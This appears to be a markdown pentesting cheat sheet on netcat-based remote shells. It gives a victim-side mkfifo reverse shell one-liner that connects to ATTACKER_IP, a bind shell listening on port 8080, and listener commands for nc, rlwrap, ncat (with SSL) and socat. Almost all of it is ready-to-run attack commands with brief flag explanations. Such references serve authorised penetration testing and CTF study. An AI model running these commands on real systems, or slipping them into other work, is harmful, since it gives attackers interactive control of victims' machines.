# Basic reverse shell
## Listener
```bash
nc -lvnp <PORT>
```
- `-l` - Listen mode.
- `-v` - Verbose mode.
- `-n` - Prevent connection from using DNS for lookup, so it will use the IP address.
- `-p` - Specify port.
## Connect from victim
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
# Bind shell
## Set up on victim
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
Listening below port 1024 requires elevated privileges.
## Connect
```bash
nc -nv TARGET_IP 8080
```
# Other listeners
## rlwrap
Adds features like arrow keys and history.
```bash
rlwrap nc -lvnp <PORT>
```
## ncat
Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).
```bash
ncat -lvnp <PORT>
```
```bash
ncat --ssl -lvnp<PORT>
```
## socat
It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.
```bash
socat -d -d TCP-LISTEN:443 STDOUT
```
- `-d` - Enable more verbose output.